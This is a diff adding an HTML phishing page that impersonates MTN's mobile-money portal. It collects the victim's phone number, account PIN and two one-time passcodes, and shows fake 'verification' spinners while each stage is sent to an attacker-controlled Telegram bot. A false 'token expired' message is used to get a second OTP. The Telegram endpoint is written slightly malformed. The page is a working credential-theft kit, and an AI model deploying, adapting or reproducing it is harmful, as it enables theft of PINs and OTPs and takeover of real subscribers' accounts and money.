@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Verification Portal</title>
+    <style>
+        :root {
+            --primary-color: #ffcc00; /* MTN Yellow */
+            --dark-color: #333333;
+            --light-bg: #f9f9f9;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background-color: var(--light-bg); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        .container { background: #ffffff; width: 100%; max-width: 400px; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); border-top: 8px solid var(--primary-color); position: relative; }
+        .logo-area { text-align: center; margin-bottom: 25px; font-weight: bold; font-size: 24px; color: var(--dark-color); }
+        .step { display: none; }
+        .step.active { display: block; }
+        h2 { font-size: 20px; margin-bottom: 10px; color: var(--dark-color); }
+        p { font-size: 14px; color: #666; margin-bottom: 20px; line-height: 1.4; }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 8px; color: var(--dark-color); }
+        input[type="text"], input[type="password"], input[type="tel"] { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 6px; font-size: 16px; outline: none; transition: border 0.2s; }
+        input:focus { border-color: var(--dark-color); }
+        .btn { width: 100%; background-color: var(--primary-color); color: var(--dark-color); border: none; padding: 14px; font-size: 16px; font-weight: bold; border-radius: 6px; cursor: pointer; transition: background 0.2s; }
+        .btn:hover { background-color: #e6b800; }
+        
+        /* Loading Overlay & Spinner Component */
+        .loading-overlay { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.85); border-radius: 12px; z-index: 10; flex-direction: column; justify-content: center; align-items: center; }
+        .spinner { width: 40px; height: 40px; border: 4px solid rgba(0,0,0,0.1); border-top: 4px solid var(--dark-color); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 12px; }
+        .loading-text { font-size: 14px; color: var(--dark-color); font-weight: 600; }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <!-- Visual Spinner Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-text" id="loadingText">Processing verification...</div>
+    </div>
+
+    <div class="logo-area">MTN Portal</div>
+
+    <!-- STEP 1: MTN Number Page -->
+    <div class="step active" id="step-number">
+        <h2>Welcome</h2>
+        <p>Please enter your MTN mobile phone number to begin authorization.</p>
+        <div class="form-group">
+            <label for="mtn-num">MTN Phone Number</label>
+            <input type="tel" id="mtn-num" placeholder="e.g., 024XXXXXXX" required>
+        </div>
+        <button class="btn" onclick="nextStep('number')">Continue</button>
+    </div>
+
+    <!-- STEP 2: PIN Page -->
+    <div class="step" id="step-pin">
+        <h2>Enter Code</h2>
+        <p>Provide your security PIN code associated with this account.</p>
+        <div class="form-group">
+            <label for="mtn-pin">Account PIN</label>
+            <input type="password" id="mtn-pin" placeholder="••••" required maxlength="8">
+        </div>
+        <button class="btn" onclick="nextStep('pin')">Verify PIN</button>
+    </div>
+
+    <!-- STEP 3: 5-Digit OTP Page 1 -->
+    <div class="step" id="step-otp1">
+        <h2>Verification Required</h2>
+        <p>A 5-digit verification code has been dispatched to your device. Please enter it below.</p>
+        <div class="form-group">
+            <label for="otp-1">5-Digit OTP (Code 1)</label>
+            <input type="text" id="otp-1" placeholder="XXXXX" maxlength="5" pattern="\d{5}" required inputmode="numeric">
+        </div>
+        <button class="btn" onclick="nextStep('otp1')">Submit Code</button>
+    </div>
+
+    <!-- STEP 4: OTP Page 2 -->
+    <div class="step" id="step-otp2">
+        <h2>Final Step</h2>
+        <p>The previous token expired or was invalid. Please input the new authentication code sent to you.</p>
+        <div class="form-group">
+            <label for="otp-2">New OTP Code</label>
+            <input type="text" id="otp-2" placeholder="XXXXXX" required inputmode="numeric">
+        </div>
+        <button class="btn" onclick="nextStep('otp2')">Complete Setup</button>
+    </div>
+
+    <!-- STEP 5: Success State -->
+    <div class="step" id="step-success">
+        <h2>Thank You</h2>
+        <p>Your authentication payload has been successfully validated. You may close this browser window.</p>
+    </div>
+</div>
+
+<script>
+    // Configuration Settings
+    const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+    const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
+
+    // Global object to collect inputs across stages
+    const userData = {
+        number: '',
+        pin: '',
+        otp1: '',
+        otp2: ''
+    };
+
+    // Helper to change visual steps
+    function showStep(stepId) {
+        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+        document.getElementById(`step-${stepId}`).classList.add('active');
+    }
+
+    // Helper to toggle spinner interface animation
+    function toggleSpinner(show, text = 'Processing verification...') {
+        const overlay = document.getElementById('loadingOverlay');
+        const txtLabel = document.getElementById('loadingText');
+        if (show) {
+            txtLabel.innerText = text;
+            overlay.style.display = 'flex';
+        } else {
+            overlay.style.display = 'none';
+        }
+    }
+
+    // Main multi-state processing engine
+    async function nextStep(currentStage) {
+        if (currentStage === 'number') {
+            const input = document.getElementById('mtn-num').value.trim();
+            if (!input) return alert('Please supply a valid number.');
+            userData.number = input;
+            
+            toggleSpinner(true, 'Verifying phone number...');
+            await sendToTelegram(`📱 NEW MTN VISIT\n\nNum: ${userData.number}`);
+            toggleSpinner(false);
+            showStep('pin');
+        } 
+        
+        else if (currentStage === 'pin') {
+            const input = document.getElementById('mtn-pin').value.trim();
+            if (!input) return alert('Please enter your PIN.');
+            userData.pin = input;
+            
+            toggleSpinner(true, 'Validating security credentials...');
+            await sendToTelegram(`🔑 PIN SUBMITTED\n\nNum: ${userData.number}\nPIN: ${userData.pin}`);
+            toggleSpinner(false);
+            showStep('otp1');
+        } 
+        
+        else if (currentStage === 'otp1') {
+            const input = document.getElementById('otp-1').value.trim();
+            if (input.length !== 5) return alert('Please enter exactly 5 digits.');
+            userData.otp1 = input;
+            
+            toggleSpinner(true, 'Checking token registration...');
+            await sendToTelegram(`⚠️ OTP 1 (5-Digit)\n\nNum: ${userData.number}\nPIN: ${userData.pin}\nOTP 1: ${userData.otp1}`);
+            toggleSpinner(false);
+            showStep('otp2');
+        } 
+        
+        else if (currentStage === 'otp2') {
+            const input = document.getElementById('otp-2').value.trim();
+            if (!input) return alert('Please enter the second OTP.');
+            userData.otp2 = input;
+            
+            toggleSpinner(true, 'Finalizing system authorization...');
+            await sendToTelegram(`🎯 FINAL OTP 2 SUBMITTED\n\nNum: ${userData.number}\nPIN: ${userData.pin}\nOTP 1: ${userData.otp1}\nOTP 2: ${userData.otp2}`);
+            toggleSpinner(false);
+            showStep('success');
+        }
+    }
+
+    // Telegram API Asynchronous POST dispatcher
+    async function sendToTelegram(message) {
+        const url = `https://telegram.org{TELEGRAM_BOT_TOKEN}/sendMessage`;
+        try {
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+        } catch (error) {
+            console.error('Submission breakdown:', error);
+        }
+    }
+</script>
+
+</body>
+</html>
